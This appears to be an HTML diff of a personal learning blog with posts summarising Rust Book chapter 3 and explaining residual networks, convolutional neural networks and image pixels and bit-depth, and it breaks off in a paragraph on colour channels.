+<pre><pre class="playground"><code class="language-rust">fn main() {
+    let a = [1, 2, 3, 4, 5];
+   
+    let months = ["January", "February", "March", "April", "May", "June", "July",
+              "August", "September", "October", "November", "December"];
+    let b: [i32; 5] = [1, 2, 3, 4, 5];
+   
+    let c = [3; 5]; // Short hand for [3,3,3,3,3]
+}
+// Arrays can be Indexed in the following way:
+fn main() {
+    let a = [1, 2, 3, 4, 5];
+
+    let first = a[0];
+    let second = a[1];
+}</code></pre></pre>
+<p>If an index that is trying the be retrieved is greater than the length of the array, rust panics and throws an IndexOutOfBounds error during runtime, this kind of check is not being performed in many low-level languages and leads to memory leakage and Invalid memory access.Rust hence ensures memory safety.</p>
+<hr />
+<h2 id="functions-1"><a class="header" href="#functions-1">Functions</a></h2>
+<p><code>fn</code> - allows declaration of new functions
+<code>main</code> - most important function, entry point to the code</p>
+<pre><pre class="playground"><code class="language-rust">fn main() {
+    println!("Hello, world!");
+
+    another_function(); // Calls the another_function()
+    // A parameter 5, of type i32 is passed to the parameterized_function()
+    parameterized_function(5,'a'); 
+}
+
+// Declaration of another_function()
+fn another_function() {
+    println!("Another function.");
+}
+
+// Using functions with parameters
+fn parameterized_function(x: i32,y:char) 
+    // We must declare the type of each parameter
+    // Use , to define multiple parameters
+{  
+    println!("The value of x and y is: {x}{y}");
+}
+
+/*
+Hello, world!
+Another function.
+The value of x and y is: 5a
+*/
+</code></pre></pre>
+<h3 id="statements-and-expressions"><a class="header" href="#statements-and-expressions">Statements and Expressions</a></h3>
+<ul>
+<li><strong>Statements :</strong> Instructions that perform an action and do not return a value, example is the <code>println</code> or the <code>let</code>. They cannot be assigned to another variable.</li>
+<li><strong>Expression :</strong> Instructions that perform an action and return a value. They can return a value that can be assingned directly to another variable. <code>5+6</code> is an expression. Calling a function or a macro is also an expression, since it returns a value. In <code>let x = 5</code>, even <code>5</code> is an expression!</li>
+</ul>
+<h3 id="returning-values-with-functions"><a class="header" href="#returning-values-with-functions">Returning values with Functions</a></h3>
+<ul>
+<li>Implicitly all functions return the return value of the last expression, but with can override that feature using the <code>return</code> keyword.</li>
+<li>We must also mention the return type using the <code>-&gt;</code>.</li>
+</ul>
+<pre><pre class="playground"><code class="language-rust">fn five() -&gt; i32 {
+    5 // Returns 5 (implicitly)
+}
+fn plus_one(x: i32) -&gt; i32 {
+    x + 1 // Returns the value of x + 1
+}
+fn plus_two(x: i32) -&gt; i32 {
+    return x + 2 // Returns the value of x + 2 (explicitly)
+}
+fn main() {
+    let x = five();
+
+    println!("The value of x is: {x}");
+}</code></pre></pre>
+<hr />
+<h2 id="comments"><a class="header" href="#comments">Comments</a></h2>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>let x = 5; // Single Line Comment
+
+/*
+Multiline 
+comment.
+*/
+<span class="boring">}</span></code></pre></pre>
+<hr />
+<h2 id="control-flow"><a class="header" href="#control-flow">Control Flow</a></h2>
+<ul>
+<li>Control flow in terms of if-conditions is very similar to other languages</li>
+</ul>
+<h3 id="if-condition"><a class="header" href="#if-condition">If Condition</a></h3>
+<pre><pre class="playground"><code class="language-rust">fn main() {
+    let number = 6;
+
+    if number % 4 == 0 { // The condition must be an expression returning a bool type.
+        println!("number is divisible by 4");
+    } else if number % 3 == 0 {
+        println!("number is divisible by 3");
+    } else if number % 2 == 0 {
+        println!("number is divisible by 2");
+    } else {
+        println!("number is not divisible by 4, 3, or 2");
+    }</code></pre></pre>
+<ul>
+<li>We can also use if in a let declaration like this,</li>
+<li>But both the if and the else bodies, must respect the type of the variable being declared and must both return the same type. This is because variable must have a single type.</li>
+</ul>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>    // This will run
+    let number = if condition { 5 } else { 6 };
+
+    // This wont
+    let number = if condition { 5 } else { "six" };
+}
+<span class="boring">}</span></code></pre></pre>
+<ul>
+<li>First if condition is checked and then else if conditions are checked in the same order and then the else condition for all other cases.</li>
+</ul>
+<h3 id="loops"><a class="header" href="#loops">Loops</a></h3>
+<ul>
+<li>The loop keyword makes rust run the loop's body over and over again until we tell it to stop explicitly by providing an end condition.</li>
+</ul>
+<pre><pre class="playground"><code class="language-rust">fn main(){
+    loop{
+        println("Hello!");
+    }
+} // Prints "Hello!" an infinite number of times, till I hit Ctrl+C</code></pre></pre>
+<ul>
+<li>One may also choose to use the <code>break</code> keyword, that stop the loop.</li>
+<li>Or the <code>continue</code> keyword, that tells the loop to move on to the next iteration, without executing what follows the continue statement in the body of the loop.</li>
+</ul>
+<pre><pre class="playground"><code class="language-rust">// By default break and continue apply to the inner loop, but we can specify a label to the loop, to mention which loop we want to break.
+fn main() {
+    let mut count = 0;
+    'counting_up: loop {
+        println!("count = {count}");
+        let mut remaining = 10;
+
+        loop {
+            println!("remaining = {remaining}");
+            if remaining == 9 {
+                break;
+            }
+            if count == 2 {
+                break 'counting_up;
+            }
+            remaining -= 1;
+        }
+
+        count += 1;
+    }
+    println!("End count = {count}");
+}</code></pre></pre>
+<p><strong>While and For Loops</strong></p>
+<pre><pre class="playground"><code class="language-rust">fn main() {
+    let mut number = 3;
+
+    while number != 0 {
+        // If the above condition is true, the loop body runs
+        println!("{number}!");
+        number -= 1;
+    }// Else Exit the loop
+
+    println!("LIFTOFF!!!");
+}
+// Using a while loop to loop through an array [Not preferred]
+fn main() {
+    let a = [10, 20, 30, 40, 50];
+    let mut index = 0;
+    while index &lt; 5 {
+        println!("the value is: {}", a[index]);
+        index += 1;
+    }
+}
+
+// Using a for loop for the same purpose
+fn main() {
+    let a = [10, 20, 30, 40, 50];
+
+    // This is a more elegant way to do the same thing
+    for element in a {
+        println!("the value is: {element}");
+    }
+
+    // 3 2 1 LIFTOFF!!! .. generates an array and .rev reverses it.
+    for number in (1..4).rev() {
+        println("{number}");
+    }
+    println("LIFTOFF!!!");
+}</code></pre></pre>
+<p>This is my summary of the <a href="https://doc.rust-lang.org/stable/book/ch03-00-common-programming-concepts.html">Rust Lang Book Chapter 3</a>. Hope you found it interesting. I will be writing code walkthroughs in the future, stay tuned :)</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="residual-networks"><a class="header" href="#residual-networks">Residual Networks</a></h1>
+<h1 id="date-2021-08-13"><a class="header" href="#date-2021-08-13"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-08-13</small></a></h1>
+<hr />
+<p>Deep Convolutional Networks are said to prevail over Wider Networks during performance, but, these networks are difficult to train. Image Classification and Image Recognition tasks have benefited greatly from deeper networks.</p>
+<h3 id="convergence-"><a class="header" href="#convergence-"><strong>Convergence :</strong></a></h3>
+<p>A Model is said to have been converged, when additional training will not improve the accuracy of the model.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*OREMxrB-OMazJ1pWrRCAEw.png" alt="Illustration of Convergence in a model." /><em>Illustration of Convergence in a model.</em></p>
+<p>**Vanishing Gradient : **During Back-propagation, the derivative of the error function with respect to the weights have to be calculated, what if this <strong>derivative is too small</strong>, and then we apply the chain rule. All these small derivatives, contribute to the final value of the gradient making it extremely tiny.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*eaLj6Nv8QzTzhFC3rsRunw.png" alt="" /></p>
+<p>So, when we take a step according to the magnitude of this resulting gradient, it is a very small step and the model almost never converges.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*Ko236Kck7NakGtMZIxgLxQ.png" alt="Sigmoid(Left) — Derivative of Sigmoid(Right)" /><em>Sigmoid(Left) — Derivative of Sigmoid(Right)</em></p>
+<p>So, from this we get to know that the sigmoid activation’s derivative becomes super small. Making the gradient small, ultimately. In short networks, this problem isn’t that prevalent, but in deep ones, it is.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*XCTh18yWso3MZ6DRL0LspQ.png" alt="" /></p>
+<p>When the Derivative w.r.t Weight becomes too small during back propagation in the initial layers, the update on the Weight in turn becomes small too. As a result of this “Vanishing Gradient”, the Initial layers of the model, train too slowly or stay the same. This makes it difficult for the model to converge.</p>
+<p>**Solution : **Batch Normalization, it is making sure that the input to the activation function is always such that, the derivative doesn’t become too small.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*xKiWSgqFatIf1ARb8CHwqQ.png" alt="" /></p>
+<p>This however can only be used to an extent. There seemed to be a limit as to the number of layers you can stack onto a network before facing the vanishing gradient problem.</p>
+<p><strong>ReLU</strong> for activation is another method we can use to help solve the vanishing gradient problem.</p>
+<p>Now, another problem is degradation or saturation of accuracy over increasing the number of layers. This degradation is not being caused by over fitting, since the training error also increases. Then, what is causing this degradation?</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*xaDYH0ZqRLMlbmOa18Uq-Q.png" alt="See how the training error for the 56 layer network is also lower that that of the 20 layer one. This degradation is hence not being caused by over fitting." /><em>See how the training error for the 56 layer network is also lower that that of the 20 layer one. This degradation is hence not being caused by over fitting.</em></p>
+<p>To investigate this further, they <strong>constructed</strong> a deep model and compared it with its shallower counter part.</p>
+<h3 id="the-experiment-"><a class="header" href="#the-experiment-">The Experiment :</a></h3>
+<p>They added layers of identity mapping and copied the other layers from the shallow model to construct the deeper network.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2002/1*rSxE4joRXKbPH3cyauTBiw.png" alt="" /></p>
+<p>So, this network will essentially learn the same function as the shallow model, the extra layers being, just identity mappings.</p>
+<p>This constructed model gave training errors no higher than its shallower counterpart.</p>
+<p>Then why isn’t it easy for a deeper model, completely trained(not constructed), to just learn the identity mapping and give us an output, that is not better, but not worse either.</p>
+<p>When tested a fully trained model(of the same dimensions), gave a less accurate output compared to the constructed one.</p>
+<p>It seems that learning the identity function is just as hard as learning any other function for a model. So, to get a way around this we made residual networks.</p>
+<h3 id="residual-connections-"><a class="header" href="#residual-connections-">Residual Connections :</a></h3>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ik_QI92uXPiA_Bg_kSAWQQ.png" alt="Residual Connection" /><em>Residual Connection</em></p>
+<p>The above block is called a Residual Block, or just give it any fancy name you want, but the important part is what it does.</p>
+<p>Lets say, you want the model or particular set of layers to learn the function H(x),</p>
+<p>Well what can we do? Just sit and hope the model learns the function, or you go about making it learn. How though?</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ip8dLQI0pzV9U2HSdcleFQ.png" alt="" /></p>
+<p>So, we just gotta make F(x) zero to get a identity mapping, and <strong>hypothesize that it is now easier to fit F(x)</strong>.</p>
+<p>Adding, these shortcut connections don’t add any extra parameters or any extra complexity to the model. Actually shortcut connections had been used for a long time before even the existence of this paper, to address the vanishing/exploding gradient issue and in <a href="https://en.wikipedia.org/wiki/Highway_network">highway networks</a>, where they were used with gating-functions.</p>
+<p>Highway Networks were just another attempt to increase the model depth, but haven’t been very successful at it.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*z7EUvoSsgWaAoG34C6WAZQ.png" alt="Structure of a Highway Network" /><em>Structure of a Highway Network</em></p>
+<p>Residual Representations, have been used in CG and Low-Level Vision tasks to <strong>solve Partial Differential Equations and in Image Recognition operations</strong>.</p>
+<h3 id="woah-how-is-it-magically-easier-to-fit-the-residual-function-fx"><a class="header" href="#woah-how-is-it-magically-easier-to-fit-the-residual-function-fx">Woah, how is it magically easier to fit the residual function F(x)?</a></h3>
+<p>I will try explaining this part, but the paper explains it super well, I encourage you all to read it.</p>
+<p>So remember when we constructed a deeper model, this model can approximate the function that can be approximated by a shallower counter-part, along with identity mappings that make it deep.</p>
+<p>Now this is where it gets interesting, remember how we face a degradation problem because it not easy to make multiple non-linear layers learn the identity mapping.</p>
+<p>If we make the residual learning reformulation, we’ll end up giving it <strong>x</strong> and tell it to learn a function such that the the output will be <strong>x.</strong></p>
+<p>To be precise, the multiple non-linear layers will simply b<strong>e driven to learn the zero function or its approximate as the residual function F(x), if it is optimal, that is the error if H(x) were a identity mapping is lesser than in any other case.</strong></p>
+<p>This way we are sort of preconditioning the multiple non-linear layers to approximate the function, which is better than learning it own your own.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ttchyjCPfDa_s9FTt4tArQ.png" alt="H(x) = Identity Mapping" /><em>H(x) = Identity Mapping</em></p>
+<p>Why should the multiple non-linear layers learn the zero function, because remember we want the layers to learn F(x), not H(x), and then we add **x **to the result and get H(x).</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*veBqoClo_yzWi9rebIZ5Bg.png" alt="And there you go, we have the identity mapping in place" /><em>And there you go, we have the identity mapping in place</em></p>
+<p>In real world scenarios, there might be other functions that are optimal, not just the identity function, for example if the zero function is found to be more optimal, the multiple non-linear layers will find it easier to find ways to deviate from the identity mapping in order to get a zero function, rather than learning it entirely on its own.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*yBi3O8_hnH4_Po_B-Pntmw.jpeg" alt="" /></p>
+<blockquote>
+<p>Well, philosophically speaking, humans need such guides to help them achieve, but, sadly not a lot get such guidance.</p>
+</blockquote>
+<h3 id="the-math-"><a class="header" href="#the-math-">The Math :</a></h3>
+<p>Now, the math, the researchers have adopted the strategy of applying residual learning to every few stacked layers.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*FYQRvcGF1LvQYNu0GlC98Q.png" alt="" /></p>
+<p>This is the ReLU activation function, can you find out why it handles the vanishing gradient problem, better than Sigmoid?</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*njuH4XVXf-l9pR_RorUOrA.png" alt="" /></p>
+<h3 id="comparison-between-vgg-nets-plain-networks-and-resnets-"><a class="header" href="#comparison-between-vgg-nets-plain-networks-and-resnets-">Comparison between, VGG Nets, Plain Networks and ResNets :</a></h3>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*xSIe60SVNRXsTu-6p5tgRA.png" alt="" /></p>
+<p>The ResNet model has comparably lower complexity and fewer filters compared to the VGG Nets. It has 3.6 Billion Floating Point Operations, which is only 18% of VGG Nets which has a whopping 19.6 Billion Floating Point Operations. The Plain Network has 3.6 Billion FLOPs too, but is less accurate.</p>
+<h3 id="legacy"><a class="header" href="#legacy">Legacy</a></h3>
+<p>ResNets were used in the ImageNet competition, where they trained on 1.28 Million training images, and evaluated on 50k validation images. They were tested on 100K test images and were reportedly having the top-1and top-5 error rates. <em>It also achieved 1st place in ILSVCRC 2015.</em></p>
+<p>The ResNet-1202 was able to overfit the CIFAR10 dataset, and yes 1202 means 1202 layers!! Take a moment to thank ResNets for making it possible.</p>
+<p>The Paper came out in 2015, I looked up <strong>Deep Learning</strong> on <strong>Google Trends,</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/2300/1*iXEXbf1TPbGYrc8fFtvjGg.png" alt="" /></p>
+<p>I would say that it was either perfectly timed or it was the key factor in popularizing Deep Learning.</p>
+<h3 id="references-"><a class="header" href="#references-">References :</a></h3>
+<blockquote>
+<p><a href="https://arxiv.org/abs/1512.03385">The ResNet Paper</a>
+<a href="https://towardsdatascience.com/batch-normalization-the-greatest-breakthrough-in-deep-learning-77e64909d81d">Batch Normalization</a></p>
+</blockquote>
+<p>Please excuse me if there are any flaws, and do correct me.</p>
+<p>Thank you for reading.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="what-are-convolutional-neural-networks"><a class="header" href="#what-are-convolutional-neural-networks">What are Convolutional Neural Networks?</a></h1>
+<h1 id="date-2021-05-14"><a class="header" href="#date-2021-05-14"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-05-14</small></a></h1>
+<hr />
+<p><img src="blogs/" alt="" />
+Images Source — Google</p>
+<p>First things first, how are images even stored in a computer?</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*5tYiY5eyRkkVDjKLMmhrXQ.png" alt="Image Credits : PacktPub" /><em>Image Credits : <a href="https://subscription.packtpub.com/">PacktPub</a></em></p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*sCSOg0W-FhEY09IPOxBnNQ.png" alt="" /></p>
+<p>In the above image, look how the brighter section of the channel plotted is the corresponding colour. Red in first channel, green in second, blue in the third.</p>
+<p>These 3 channels or matrices come together to give us different colours, each element of the matrix denotes a pixel value ranging from 0 to 255.</p>
+<p>Gray-scale Images have one channel in them, in further discussion, when I refer to image, it is a gray-scale image.</p>
+<h3 id="why-not-use-just-traditional-neural-networks"><a class="header" href="#why-not-use-just-traditional-neural-networks">Why not use just traditional neural networks?</a></h3>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ehZ7LhczF1rANBM5dcmXPg.png" alt="Image Credit : DLpng" /><em>Image Credit : <a href="https://dlpng.com/png/6033845">DLpng</a></em></p>
+<p><strong>Input Size</strong>: For every small increase in the size of the input matrix, the number of parameters that have to be trained in the network increases greatly.</p>
+<p>For Example: If we had an image size of <strong>150 x 150 x 3</strong>, indicating a 150 x 150 image with 3 colour channels, we would have to train <strong>67,500 parameters</strong>, but for a <strong>160 x 160 x 3</strong> image we would have to train <strong>76,800 parameters</strong>. That’s around 9000 parameters for the addition of just 10 pixels on each side!</p>
+<p>These are just small images, most images we deal with in Deep Learning problems are easily over 500 pixels in height and width. Training these many parameters will eventually lead to over-fitting and increased training times.</p>
+<p><strong>Spatial and Translation Variance:</strong> A traditional neural network can’t gives different outputs for the cat in the bottom left corner of the picture and the same cat in the top right corner of the picture. This is a major drawback since, we cannot possibly train the model on every single variation of the picture!</p>
+<p>It is just not feasible!</p>
+<p>That’s the reason why we need Convolutional Neural Networks…</p>
+<p><img src="https://cdn-images-1.medium.com/max/2510/1*F2Ik_XFzmu5jZF-byiAKQQ.jpeg" alt="Images Source — Google" /><em>Images Source — Google</em></p>
+<blockquote>
+<p>CNN’s are the visual cortex of the deep learning world. They don’t train on the values of the pixels, but rather remember the features in the object by using filters.</p>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*7p6rKLpjP0u3x0KxsDYrTw.gif" alt="The Best Illustration I could find for a convolution operation : Images Source — Google" /><em>The Best Illustration I could find for a convolution operation : Images Source — Google</em></p>
+<p>A Convolutional kernel is applied on the image channel and the value is stored and a feature-map is generated, convolution is further performed on the same feature map to ultimately extract the features in the image.</p>
+<blockquote>
+<h1 id="every-convolutional-kernel-has-specific-properties-some-can-detect-edges-in-the-image-some-can-blur-the-image-but-ultimately-they-preserve-the-features-and-discard-any-spatial-data-like-what-angle-the-object-is-in-with-respect-to-the-vertical-or-what-direction-the-object-is-facing-this-is-why-cnns-are-preferred-against-traditional-networks"><a class="header" href="#every-convolutional-kernel-has-specific-properties-some-can-detect-edges-in-the-image-some-can-blur-the-image-but-ultimately-they-preserve-the-features-and-discard-any-spatial-data-like-what-angle-the-object-is-in-with-respect-to-the-vertical-or-what-direction-the-object-is-facing-this-is-why-cnns-are-preferred-against-traditional-networks"><strong>Every Convolutional Kernel has specific properties, some can detect edges in the image, some can blur the image, but ultimately they preserve the features and discard any spatial data, like what angle the object is in with respect to the vertical or what direction the object is facing. This is why, CNN’s are preferred against traditional networks.</strong></a></h1>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*iUKYx5tV60vpTleaw6A33A.png" alt="Image Credit: Blogs SAS" /><em>Image Credit: <a href="https://blogs.sas.com/content/subconsciousmusings/2019/07/03/convolutional-neural-networks-briefly/#prettyPhoto">Blogs SAS</a></em></p>
+<p>Have a look at this notebook, I created to visualise the outputs of each layer,
+<a href="https://www.kaggle.com/saaisudarsanand/intel-image-classification-feature-map-extraction"><strong>Intel Image Classification(Feature Map Extraction)</strong>
+<em>Explore and run machine learning code with Kaggle Notebooks | Using data from Intel Image Classification</em>www.kaggle.com</a></p>
+<blockquote>
+<p>Why does this work?</p>
+</blockquote>
+<p>Each Filter is used to efficiently identify a feature, how, take a look at this,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*RWhCmpNyp8GBTU62w8e9gA.png" alt="Images Source — Google" /><em>Images Source — Google</em></p>
+<p>The receptive field is the part of the input considered for feature identification, it is equal to the filter-size, <strong>the size of the filter is hence, a hyper-parameter.</strong></p>
+<blockquote>
+<p><strong>KERNEL</strong> : One channel in a filter
+<strong>FILTER</strong> : Combination of the 3 kernels used for the 3 different channels</p>
+</blockquote>
+<p>The Receptive Field in ‘Fig 1’ is multiplied and summed with the filter, the given filter is able to identify the feature and hence we get a large value, but in case the filter is held against a receptive field that doesn’t contain the feature,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*4WSBStbo4VHb_hRD4icmSA.png" alt="Images Source — Google" /><em>Images Source — Google</em></p>
+<p>The filter when held over a different receptive field, gives a value of 0 or near zero, indicating the <strong>absence of the feature</strong> it represents in that image.</p>
+<p>After every Convolution, operation followed by a few steps, the features become more and more undefinable, take a look,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*_fzcpK_Alw3_zA16xSmw4g.png" alt="The Full Image Size(150 x 150)" /><em>The Full Image Size(150 x 150)</em></p>
+<blockquote>
+<p><strong>After 1 Convolution Operation,</strong></p>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*UcG4BAba4t6OIXx5cAQ8_Q.png" alt="" /></p>
+<p>It is kind of describable at this layer, now these are called feature maps and are not to be called images anymore.</p>
+<p>Look how the feature size has reduced, this is due an operation called pooling. That is a intermediary step.</p>
+<blockquote>
+<p><strong>After 2 Operations,</strong></p>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*Zok87NjZpzCLaamOVoi03Q.png" alt="" /></p>
+<p>OKAY, things have gotten worse, now if I haven’t seen the initial image, I won’t be able to identify this as a image of buildings.</p>
+<blockquote>
+<p><strong>After 3 Operations,</strong></p>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*Kd0BEXUkAc587U6bYw2hLQ.png" alt="" /></p>
+<p>Its totally gone now, indescribable to human eyes, but these feature maps are further extracted to this state,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*DIcCt2rWgzc1GnSlVKCJKA.png" alt="" /></p>
+<p>These are the features that will be detected or searched for by the filters of the CNN, these feature maps will be flattened and learnt by the fully connected layers later-on.</p>
+<p>CNN’s were <strong>designed by bio-mimicry of the mammalian visual cortex</strong>, so <strong>the next time you call yourself an idiot, remember, your idiocy isn’t a product of your marks or grades or ranks, it is a product of your own belief</strong>. So, its time to start believing in yourself, now continue this article with this refreshing thought.</p>
+<p>The filters are optimised by the Back propagation algorithm.</p>
+<p>Filters can be applied on multiple channels too,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ECr1NlqLymjiExU0Ue5J9g.png" alt="Actual Representation of a Filter in a CNN, C = No. of channels and F = Kernel Size, defined by us. : Images Source — Google" /><em>Actual Representation of a Filter in a CNN, C = No. of channels and F = Kernel Size, defined by us. : Images Source — Google</em></p>
+<p>You might have noticed that, filters reduce the image’s size, causing unwanted shrinking of the image, which <strong>might also result in the loss of data in the boundaries of the image</strong>.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*aJTCU26VdtLQG3-_JX3M9Q.gif" alt="" /></p>
+<p><strong>In the first image, the padding is ‘valid’</strong>, the other 3 images have a padding as ‘same’. The 3rd image being given a padding of 1, will be able to give rise to the image of the same size. Padding, simply refers to zeros being added to the edges of the image, along the rows and columns.</p>
+<p>**Stride **: The number of pixels by which the filter moves after when performing each convolution operation is the stride.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*OZRaavOBf50uLEAk4Ae-1A.png" alt="Images Source — Google" /><em>Images Source — Google</em></p>
+<blockquote>
+<p><strong>Pooling</strong></p>
+</blockquote>
+<p><strong>Pooling</strong> is done in order to** reduce the dimensions of the feature maps**, which ultimately ends up reducing the number of parameters in the model. The no. of parameters must be reduced if possible, in order to reduce computational pressure. This also allows the model to be <strong>even more spatially invariant, since we are discarding any remaining spatial data</strong>.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*u7f0kRKQnpDAbF_EWdFTCw.png" alt="Images Source — Google" /><em>Images Source — Google</em></p>
+<p>This operation is also done by moving kernels over the feature map.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*lhiWMFM8tw4s-a2FOdn3RA.png" alt="How stride affects the size of the output : Images Source — Google" /><em>How stride affects the size of the output : Images Source — Google</em></p>
+<p><strong>Max Pooling</strong> selects the <strong>brightest pixel</strong>, and therefore <strong>emphasising the sharp edges</strong> in the images. It works well for images with a black or dark background, where there will be a sharp drop in the distribution of pixel values in the kernel.</p>
+<p><strong>Average Pooling</strong> outputs the average and <strong>smooths out the image</strong>, it is doesn’t do a great job in detecting sharp edges, but most of the image data is preserved, since nothing is eliminated and all values in the kernel are involved in the operation.</p>
+<blockquote>
+<p><strong>If we want to reduce dimensions anyway, why do we use padding?</strong></p>
+</blockquote>
+<p>Simple, Pooling doesn’t cause as much data loss, it almost never. But, when dimensionality reduces by filters, the valuable data in the boundaries is lost, this is uncontrollable, without padding, whereas, <strong>Pooling is controlled by us by addition and removal of pooling layers.</strong></p>
+<blockquote>
+<p><strong>Activation : ReLU (Rectified Linear Unit)</strong></p>
+</blockquote>
+<p><strong>Why ReLU?</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*jOU3PnNiB0YIH1Y_t-iXng.png" alt="F(x) = max(0,x) : Images Source — Google" /><em>F(x) = max(0,x) : Images Source — Google</em></p>
+<p>The ReLU function completely <strong>eliminates the possibility of negative values in the filters</strong>. It <strong>acts and looks like a linear function</strong> when the input is above zero, but its <strong>non-linearity is visible only when the input value is less than zero</strong>.</p>
+<p>This property of the ReLU unlike all other activation function makes it possible for the model to <strong>learn complex relationships in the data</strong>.</p>
+<p>Networks that use the rectifier function for the hidden layers are referred to as rectified networks.</p>
+<p>ReLU also is easy to code, and is <strong>faster to implement</strong> in Neural Networks, which implies, lesser computational requirements.</p>
+<p>It has been found that rectifying non-linearity is the single most important factor in improving recognition accuracy of the model.</p>
+<p>All this makes ReLU suitable for CNN’s.</p>
+<blockquote>
+<p><strong>Finally, the fully connected layers,</strong></p>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*N8Drw_7X7OTSINgzhOydpw.png" alt="Images Source — Google" /><em>Images Source — Google</em></p>
+<p>The <strong>Flatten layer is a simple process where the 2D matrix is converted to a 1D Matrix for giving it as an input for the Fully Connected layers.</strong></p>
+<p>The Fully Connected Layer is just a normal Feed-Forward Neural network that gives as output a set of “n” probabilities for an input image being a part of one of “n” classes. We use a Soft-max Activation to achieve this.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*cbmtTZt2j-0cAfiwbb3GEQ.png" alt="The Soft-max Activation Function : Images Source — Google" /><em>The Soft-max Activation Function : Images Source — Google</em></p>
+<p>Thank You, your valuable feedback is definitely appreciated.</p>
+<p>Remember never to stop having fun when creating new things : )</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="image-functions-pixels-and-types-of-image-processing"><a class="header" href="#image-functions-pixels-and-types-of-image-processing">Image Functions, Pixels and Types of Image Processing</a></h1>
+<h1 id="date-2021-07-13"><a class="header" href="#date-2021-07-13"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-07-13</small></a></h1>
+<hr />
+<p>Some Mathematics to begin with….</p>
+<p>In my previous post, I gave a definition, and now I’m obligated to elaborate,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*vDr11MZC45MHaYO713QexQ.png" alt="" /></p>
+<p>An Image maybe defined as a 2D function f(x,y), where x and y are spatial coordinates and the amplitude of f at any pair of coordinates is the intensity or the grey level at that point.</p>
+<p>Any Analog Image has to be Sampled and Quantised in order to convert it into digital images for it to be read by our computer. Else, we will be facing the** ‘infinity’ **problem.</p>
+<p>A digital image is an image composed of picture elements or pixels, each of which has a finite and discrete quantity of numeric value representing its intensity or the grey level.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*6nxQFHM1kS1fAzYO65kMSA.png" alt="Each little square is a pixel" /><em>Each little square is a pixel</em></p>
+<p>In the above 10*10 image consider the origin is in the top left corner and the <strong>Rows span along Y-Axis</strong> and <strong>Columns span along X-Axis</strong>.</p>
+<p>If the color black has an intensity of 1 and white has an intensity of 0, then,</p>
+<blockquote>
+<h1 id="we-say-that-the-pixel-with-x--4column-and-y--5row-has-an-intensity-of-1-and-hence-f4-5--1"><a class="header" href="#we-say-that-the-pixel-with-x--4column-and-y--5row-has-an-intensity-of-1-and-hence-f4-5--1">We say that, the pixel with x = 4(Column) and y = 5(Row) has an intensity of 1 and hence f(4, 5) = 1.</a></h1>
+</blockquote>
+<p>Each pixel can be represented by ‘k’ bits, and will have 2^k number of different values of intensities or grey levels.</p>
+<p>The value of ‘k’ is called the <strong>bit-depth.</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*QZd9XkX0kz-IAVJclGsTQg.png" alt="Credit How many shades of grey are you able to see? Purely Representational" />*<a href="https://gregbenzphotography.com/photography-tips/8-vs-16-bit-depth-photoshop">Credit</a> How many shades of grey are you able to see? <em>Purely Representational</em>*</p>
+<p>So, if there is a image with a bit-depth of 3, then we will have 8 different grey levels and for a bit-depth of 8, we will have 256 different grey levels.</p>
+<p>The bit-depth also helps in improving the efficiency of digitization, and gives us the closest possible image of the real thing. We get a more accurate representation of the signal that is converted into the image. Allowing us to record even subtle changes in the signal.</p>
+<p>This is comparable to how we increase the number of digits after the decimal point to increase the precision of the measurement. Do not confuse this with Image Resolution which is a independent concept.</p>
+<p>Why can’t we just keep raising the bit-depth? Read on…</p>
+<p><strong>Channels:</strong></p>
+<p>The Number of numbers we will need to define the color value of each pixel determines the number of channels the pixel has, for example, each pixel in an RGB image has 3 channels, namely, Red, Green and Blue channels, each channel has a grey level,</p>
